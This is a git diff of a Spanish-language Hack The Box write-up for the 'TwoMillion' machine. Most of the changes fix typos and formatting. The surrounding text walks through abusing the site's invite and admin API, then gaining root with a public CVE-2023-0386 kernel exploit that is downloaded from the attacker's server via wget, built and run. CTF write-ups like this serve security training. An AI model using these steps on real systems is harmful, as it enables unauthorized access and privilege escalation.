@@ -28,7 +28,7 @@ Vamos a acceder a la web de la máquina a ver que nos encontramos:
 
 ![img](/assets/img/post/twomillion/135f6787-2cac-4eec-9830-bde4eed97ef5.png)
 
-La página es **estática**, todos los botones no son funcionales, menos los botones ```Join``` y ```Login``` . El que nos interesa es el ```Join```, el cual nos redirige a ```/invite```:
+La página es **estática**, ninguno de los botones es funcional, menos los botones ```Join``` y ```Login``` . El que nos interesa es el ```Join```, el cual nos redirige a ```/invite```:
 
 ![img](/assets/img/post/twomillion/4e48a578-9bed-43a4-a170-dbd2bcc5e5cd.png)
 
@@ -54,7 +54,9 @@ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
 
 Podemos ver que hay un **mensaje encriptado**, pero nos indica que tipo de cifrado, el cual es ```ROT13``` . Podemos acceder al recurso [rot13](https://rot13.com/) donde podemos introducir el mensaje encriptado y nos devolvera el output de manera legible. El mensaje que conseguimos es el siguiente:
 
-> In order to generate the invite code, make a POST request to /api/v1/invite/generate
+```bash
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
+```
 
 El mensaje nos indica que podemos realizar una petición por ```POST``` a ```/api/v1/invite/generate``` para generar un código de invitación. Vamos a ver que ocurre
 
@@ -114,7 +116,7 @@ Vamos a realizar otra petición a ```/api/v1``` a ver que podemos sacar
 
 ![img](/assets/img/post/twomillion/56a355a8-0630-49e1-b77f-baf161db8c37.png)
 
-En este punto obtenemos una lara lista de ```endpoints``` de la ```api``` . Los que más nos interesan son los que están relacionados con ```admin```
+En este punto obtenemos una larga lista de ```endpoints``` de la ```api``` . Los que más nos interesan son los que están relacionados con ```admin```
 
 Vamos a realizar una petición ```PUT``` a ```/admin/settings/update``` para ver que ocurre
 
@@ -211,46 +213,57 @@ Utilizando el comando ```uname -a``` podemos ver que en la máquina víctima tie
 Vamos a descargar el exploit de este [repositorio](https://github.com/xkaneiki/CVE-2023-0386) de github
 
 Este lo clonaremos en nuestra máquina de atacante, y con el uso de
+
  ```bash
  tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386
  ```
+
 crearemos un archivo comprimido del repositorio.
 
 Utilizaremos
+
  ```bash
  python3 -m http.server 80
- ``` 
+ ```
+
  para crear un servidor donde estará el archivo, y por último, estando en la ruta ```/tmp``` de la máquina víctima donde tenemos permiso de escritura, usaremos
 
 ```bash
 wget http://10.10.14.18/CVE-2023-0386.tar.bz2
 ```
+
 para conseguir el archivo.
 
 > Todo este proceso se debe a que las máquinas de HTB no tienen acceso a internet
 
-Descomprimiremos el archivo con 
+Descomprimiremos el archivo con
+
 ```bash
 tar -xf CVE-2023-0386.tar.bz2
 ```
-y accederemos al archivo descomprimido donde haremos  
+
+y accederemos al archivo descomprimido donde haremos
+
 ```bash
 make all
 ```
+
 posteriormente seguiremos las instrucciones del repositorio.
 
-Primero ejecutaremos 
+Primero ejecutaremos
 
 ```bash
 ./fuse ./ovlcap/lower ./gc
 ```
+
 posteriormente
 
 ```bash
 ./exp
 ```
+
 y así ya tendremos acceso **completo** a la máquina como root y a la **root flag**
 
 ![img](/assets/img/post/twomillion/fce27810-42da-4d4e-9cc7-05512090e491.png)
 
-Espero que os haya gustado y servido, cualquier comentario es de muchas ayuda. Adios!
+*Espero que os haya gustado y servido, cualquier comentario es de mucha ayuda. Adios!*
